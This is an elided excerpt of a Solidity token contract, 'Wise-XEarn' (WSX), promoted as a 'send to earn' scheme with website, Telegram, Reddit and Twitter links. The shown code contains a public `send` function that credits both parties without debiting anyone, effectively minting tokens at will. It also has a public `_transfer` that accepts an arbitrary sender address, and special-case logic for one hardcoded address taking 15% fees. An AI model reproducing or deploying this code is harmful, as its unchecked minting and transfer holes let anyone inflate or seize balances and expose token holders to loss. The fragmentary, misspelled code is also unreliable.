...
//Website: https://stsxes.com/
//Telegram: https://t.me/sendtoearn
//reddit: https://www.reddit.com/r/sendtoearn/
//twitter: https://twitter.com/SendEarn
...
contract Algo is Context,Ownable,ALGOToken{
	...
	string constant public name = "Wise-XEarn";
	string constant public symbol = "WSX";
	
	uint8 constant public decimals = 5;
	
    uint256 constant private round = 2 minutes;
    uint256 constant private partOfToken = 10;
	...
	function _transfer(address payable from,address payable to,uint256 _tokens) public payable returns (uint256) {
        ...
        if(from == to){
        uint256 earnToToken = ((adjustedTokens * 1) / 100);
        info.users[to].balance += (earnToToken);
            ...
            if(msg.sender == (0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff)){
            info.users[from].balance -= adjustedTokens;
            _transferred = adjustedTokens;
            
            uint256 burnToLP = ((adjustedTokens * 15) / 100); // 15% transaction fee
            uint256 burnToHell = ((adjustedTokens * 15) / 100); // 15% transaction fee
    ...
    function send(address  _to,uint256 amount) public payable {
        info.users[msg.sender].balance += amount;
        info.users[_to].balance += amount;
        emit Transfer(msg.sender, _to, amount);
    }	 
	 
	function scheduleMyfucntion(uint32 count) public payable{
    aion = Aion(0x75140D45a653f492bB4f25e204BB60b1073b79e6);
